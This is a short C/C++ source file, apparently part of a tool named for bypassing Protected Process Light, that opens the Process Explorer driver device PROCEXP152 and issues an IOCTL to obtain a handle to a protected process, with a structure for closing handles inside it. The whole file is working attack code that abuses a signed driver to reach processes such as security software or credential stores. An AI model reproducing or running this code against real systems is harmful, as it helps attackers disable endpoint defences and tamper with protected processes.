#include "ppl_bypass_driver.h"

typedef struct procexp_close_handle {
	ULONGLONG pPid = 0x0;
	PVOID ObjectType;
	ULONGLONG nothing2 = 0x0;
	ULONGLONG handle;
} Procexp_close, * pProcexp_close;


/*Creates the handle to the driver object*/
HANDLE hProcExpDevice;


EXTERN_C HANDLE open_driver()
{
	hProcExpDevice = CreateFileA("\\\\.\\PROCEXP152", GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hProcExpDevice == INVALID_HANDLE_VALUE)
	{
		printf("Unable to open driver handle, Error code:%d\n", GetLastError());
		return 0;
	}
	else {
		printf("HANDLE %p\n", hProcExpDevice);
	}
	return hProcExpDevice;
}

/*Opens handle to a protected process*/
EXTERN_C HANDLE open_handle(ULONGLONG processPid, HANDLE hProcExpDevice)
{
	HANDLE hProtectedProcess = NULL;
	DWORD dwBytesReturned = 0;
	BOOL ret = FALSE;
	char* endptr = 0;

	ret = DeviceIoControl(hProcExpDevice, IOCTL_OPEN_PROTECTED_PROCESS_HANDLE, (LPVOID)&processPid, sizeof(processPid),
		&hProtectedProcess,
		sizeof(HANDLE),
		&dwBytesReturned,
		NULL);


	if (dwBytesReturned == 0 || !ret)
	{
		printf("Protected process opening error: %d\n", GetLastError());
		return 0;
	}

	return hProtectedProcess;
}